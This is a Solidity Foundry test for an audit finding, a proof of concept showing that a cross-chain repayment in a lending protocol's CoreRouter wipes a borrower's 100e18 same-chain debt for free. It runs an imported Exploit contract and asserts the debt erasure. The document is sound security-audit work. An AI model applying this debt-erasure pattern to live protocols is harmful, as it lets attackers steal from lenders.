// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, CoreRouter, LendStorage, LToken, MiniToken} from
    "./58385-lend-cross-chain-repayment-updates-same-chain-borrow-balances.sol";

// Lend V2 H-16 (finding 58385): CoreRouter.repayBorrowInternal runs the
// "Update same-chain borrow balances" block unconditionally, so a cross-chain
// repayment (_isSameChain == false) deletes the borrower's untouched same-chain
// borrowBalance. Alice repays a 30e18 cross-chain debt and her 100e18
// same-chain debt is wiped for free.
contract Finding58385Test is Test {
    function test_exploit_crossChainRepay_wipesSameChainDebt() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("same-chain debt before", e.sameChainDebtBefore());
        emit log_named_uint("cross-chain repaid", e.crossChainRepaid());
        emit log_named_uint("same-chain debt after", e.sameChainDebtAfter());
        emit log_named_uint("wiped same-chain debt (lender loss)", e.wipedSameChainDebt());

        assertEq(e.sameChainDebtBefore(), 100 ether, "same-chain debt should start at 100e18");
        assertEq(e.crossChainRepaid(), 30 ether, "only the 30e18 cross-chain debt was repaid");
        assertEq(e.sameChainDebtAfter(), 0, "same-chain debt wrongly wiped to 0");
        assertEq(e.wipedSameChainDebt(), 100 ether, "100e18 same-chain debt erased for free");
    }
}
